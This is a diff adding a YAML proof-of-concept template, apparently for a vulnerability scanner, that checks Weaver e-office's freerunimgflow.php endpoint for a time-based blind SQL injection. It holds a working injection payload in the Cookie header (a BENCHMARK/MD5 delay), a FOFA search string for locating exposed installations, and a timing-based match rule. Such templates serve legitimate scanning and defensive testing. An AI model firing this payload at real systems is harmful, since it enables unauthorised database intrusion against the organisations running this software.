@@ -1,0 +1,19 @@
+id: poc-yaml-weaver-e-office-freerunimgflow-sqli
+info:
+  name: 泛微OA e-office freerunimgflow SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+  fofa: app="泛微-EOffice"
+variables:
+  t1: random_int(3,7)
+  t2: t1 + 3
+requests:
+- method: GET
+  path: /general/workflow/freerunimgflow.php
+  headers:
+    Cookie: RUN_ID=1 AND 9814=BENCHMARK({{.t1}}000000,MD5(0x55615462))
+  expression: status_code == 200 && contains(body,"Warning") && contains(body,"Variable
+    passed to each()") && duration > t1 && duration < t2
+transport: http
